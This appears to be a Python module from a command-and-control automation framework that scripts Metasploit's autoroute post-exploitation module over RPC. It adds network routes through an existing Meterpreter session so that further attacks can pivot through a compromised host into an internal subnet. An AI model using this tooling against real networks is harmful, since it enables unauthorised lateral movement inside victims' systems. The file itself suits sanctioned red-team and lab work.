
""" 
post/multi/manage/autoroute 
This module manages session routing via an existing Meterpreter session. 
It enables other modules to 'pivot' through a compromised host 
when connecting to the named NETWORK and SUBMASK. Autoadd will search a 
session for valid subnets from the routing table and interface list 
then add routes to them. Default will add a default route so that 
all TCP/IP traffic not specified in the MSF routing table will be routed 
through the session when pivoting. 
"""
from c2_settings import MSF_SERVER, MSF_PWD
from pymetasploit.msfrpc import MsfRpcClient

def run(client, SESSION, CMD='autoadd', NETMASK='255.255.255.0', SUBNET=''):
    """
    Setup autoroute for pivoting via existing Meterpreter session
    \n:param client: MsfRpcClient object
    \n:param SESSION: numeric session id
    \n:param CMD: add, *autoadd, print, delete, default
    \n:param NETMASK: Netmask eg. IPv4 as "255.255.255.0" or CIDR as "/24"
    \n:param SUBNET: Subnet (IPv4, for example, 10.10.10.0)
    """

    console = client.consoles.console()
    # copy from Armitage
    console.write('use post/multi/manage/autoroute')
    console.write('set NETMASK {0}'.format(NETMASK))
    console.write('set SESSION {0}'.format(SESSION))
    console.write('set CMD {0}'.format(CMD))
    if(SUBNET is not ''):
        console.write('set SUBNET {0}'.format(SUBNET))
    console.write('run -j')


# for unit testing of each technique
if __name__ == '__main__':
    client = MsfRpcClient(MSF_PWD, server=MSF_SERVER,ssl=False)
    # autoadd is easiest, but one can be more specific:
    run(client, 5, CMD='add', NETMASK='/24', SUBNET='192.168.181.0')